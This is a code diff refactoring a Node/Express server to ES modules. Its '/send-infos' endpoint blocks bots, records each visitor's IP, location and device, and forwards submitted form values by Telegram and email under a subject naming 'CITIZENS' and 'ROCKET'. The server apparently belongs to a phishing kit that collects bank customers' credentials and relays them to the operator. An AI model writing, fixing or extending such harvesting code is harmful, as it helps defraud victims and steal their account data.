@@ -1,20 +1,25 @@
+import "dotenv/config";
 import express from "express";
+
+//@ts-ignore
 import noBots from "express-nobots";
+
 import geoip from "geoip-lite";
 import MobileDetect from "mobile-detect";
 
-require("dotenv").config();
-
-import { sendEmail } from "./utils/sendEmail";
+import { sendEmail } from "./utils/sendEmail.js";
 import path from "path";
-import { sendTelegram } from "./utils/sendTelegram";
+import { fileURLToPath } from "url";
+import { sendTelegram } from "./utils/sendTelegram.js";
+
+const __filename = fileURLToPath(import.meta.url);
+const __dirname = path.dirname(__filename);
 
 const app = express();
 
 const port = process.env.PORT || 5000;
 
 app.use(noBots());
-app.use(express.json());
 
 app.post("/send-infos", async (req, res) => {
   const md = new MobileDetect(req.headers["user-agent"] as string);
@@ -105,7 +110,6 @@ ${
 
     if (process.env.TO) {
       await sendEmail(
-        process.env.TO as string,
         message,
         `CITIZENS - ${values.form} by ROCKET 🚀🚀🚀 From ${ip}`
       );
